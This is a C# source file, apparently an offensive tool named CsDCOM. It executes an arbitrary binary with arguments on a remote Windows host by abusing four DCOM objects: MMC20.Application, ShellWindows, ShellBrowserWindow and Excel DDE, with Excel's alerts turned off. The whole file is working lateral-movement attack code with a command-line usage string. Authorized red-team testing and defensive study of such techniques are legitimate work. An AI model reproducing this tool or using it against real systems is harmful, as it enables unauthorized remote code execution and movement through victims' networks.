using System;
using System.Reflection;

namespace CsDCOM
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 4)
            {
                Console.WriteLine(" [x] Invalid number of arguments");
                Console.WriteLine("     Usage: DCOM.exe <targetMachine> <binary> <arg> <method>");
                return;
            }

            string target = args[0];
            string binary = args[1];
            string arg = args[2];
            string method = args[3];

            if (method.ToLower() == "mmc20.application")
                MMC20Application(target, binary, arg);
            else if (method.ToLower() == "shellwindows")
                ShellWindows(target, binary, arg);
            else if (method.ToLower() == "shellbrowserwindow")
                ShellBrowserWindow(target, binary, arg);
            else if (method.ToLower() == "exceldde")
                ExcelDDE(target, binary, arg);
            else
                Console.WriteLine(" [x] Invalid Method");
        }

        private static void MMC20Application(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromProgID("MMC20.Application", target);
                var obj = Activator.CreateInstance(type);
                var doc = obj.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj, null);
                var view = doc.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, doc, null);
                view.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, view, new object[] { binary, null, arg, "7" });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        private static void ShellWindows(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromCLSID(new Guid("9BA05972-F6A8-11CF-A442-00A0C90A8F39"), target);
                var obj = Activator.CreateInstance(type);
                var item = obj.GetType().InvokeMember("Item", BindingFlags.InvokeMethod, null, obj, null);
                var doc = item.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, item, null);
                var app = doc.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, doc, null);
                app.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, app, new object[] { binary, arg, @"C:\Windows\System32", null, 0 });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        private static void ShellBrowserWindow(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromCLSID(new Guid("C08AFD90-F2A1-11D1-8455-00A0C91F3880"), target);
                var obj = Activator.CreateInstance(type);
                var doc = obj.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj, null);
                var app = doc.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, doc, null);
                app.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, app, new object[] { binary, arg, @"C:\Windows\System32", null, 0 });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        private static void ExcelDDE(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromProgID("Excel.Application", target);
                var obj = Activator.CreateInstance(type);
                obj.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, obj, new object[] { false });
                obj.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, obj, new object[] { binary, arg });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }
    }
}